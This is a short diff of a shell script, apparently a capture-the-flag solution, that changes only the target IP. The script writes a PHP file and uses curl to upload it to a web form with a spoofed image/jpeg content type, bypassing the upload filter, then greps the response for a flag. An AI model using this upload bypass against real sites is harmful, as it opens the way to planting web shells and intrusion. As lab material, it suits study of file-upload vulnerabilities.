@@ -1,7 +1,7 @@
 echo '<?php echo "LHAKER"; ?>' > /tmp/malicious.php &&
 curl -X POST \
  -F "Upload=Upload" -F "uploaded=@/tmp/malicious.php;type=image/jpeg" \
- "http://10.12.100.107/?page=upload"\ | grep 'flag'
+ "http://10.12.100.90/?page=upload"\ | grep 'flag'
 
 # -F sends data as multipart/form-data, mimicking a form submission.
 
